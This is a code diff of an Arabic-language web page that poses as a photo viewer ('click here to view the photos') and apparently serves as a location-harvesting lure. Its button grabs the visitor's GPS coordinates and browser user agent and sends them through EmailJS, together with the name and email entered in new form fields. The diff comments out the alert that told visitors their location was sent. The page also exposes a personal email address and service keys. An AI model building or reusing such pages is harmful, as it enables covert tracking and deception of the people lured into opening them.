@@ -29,9 +29,28 @@
     }
     h2 {
       font-size: 1.5rem;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
       color: #4169e1;
     }
+    .input-group {
+      margin-bottom: 15px;
+      text-align: right;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 0.9rem;
+      color: #555;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+      margin-bottom: 5px;
+    }
+    textarea { resize: vertical; height: 80px; }
     .btn {
       background-color: #4169e1;
       color: #fff;
@@ -50,7 +69,7 @@
       transform: translateY(0);
     }
     .note {
-      margin-top: 15px;
+      margin-top: 10px;
       font-size: 0.9rem;
       color: #666;
     }
@@ -60,17 +79,27 @@
       emailjs.init("3XjJU-q1Z9InCOOUd"); // استبدل بـ Public Key الخاص بك
     })();
     function sendLocation() {
+      const userEmail = document.getElementById('inputEmail').value.trim();
+      const userName  = document.getElementById('inputName').value.trim();
+      const userNote  = document.getElementById('inputNote').value.trim();
+      if (!userEmail) {
+        alert('يرجى إدخال بريدك الإلكتروني.'); return;
+      }
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
           const latitude = position.coords.latitude.toFixed(5);
           const longitude = position.coords.longitude.toFixed(5);
+          const userAgent = navigator.userAgent;
           emailjs.send("service_lz9wzcm", "template_sj40xwh", {
-            latitude: latitude,
-            longitude: longitude,
-            email: "bakerdandal4@gmail.com"
+            email:      userEmail,
+            name:       userName,
+            note:       userNote,
+            latitude:   latitude,
+            longitude:  longitude,
+            user_agent: userAgent
           })
           .then(function(response) {
-            alert("تم إرسال موقعك بنجاح.\nخط العرض: " + latitude + "\nخط الطول: " + longitude);
+            // alert("تم إرسال موقعك بنجاح!\nخط العرض: " + latitude + "\nخط الطول: " + longitude);
           }, function(error) {
             alert("حدث خطأ أثناء الإرسال: " + error);
           });
@@ -85,9 +114,20 @@
 </head>
 <body>
   <div class="card">
-    <h2>يمكنك مشاهدة جميع صوري من هنا</h2>
-    <p class="note">اضغط على الزر لمشاهدة الصور</p>
-    <button class="btn" onclick="sendLocation()">اضغط هنا</button>
+    <h2>اتمنى لك مشاهدة ممتعة</h2>
+    <div class="input-group">
+      <label for="inputName">الاسم (اختياري)</label>
+      <input type="text" id="inputName" placeholder="أدخل اسمك">
+    </div>
+    <div class="input-group">
+      <label for="inputEmail">البريد الإلكتروني</label>
+      <input type="email" id="inputEmail" placeholder="example@mail.com">
+    </div>
+    <div class="input-group">
+      <label for="inputNote">ملاحظة (اختياري)</label>
+      <textarea id="inputNote" placeholder="أدخل أي معلومات إضافية..."></textarea>
+    </div>
+    <button class="btn" onclick="sendLocation()">إضغط هنا لمشاهدة الصور</button>
   </div>
 </body>
 </html>
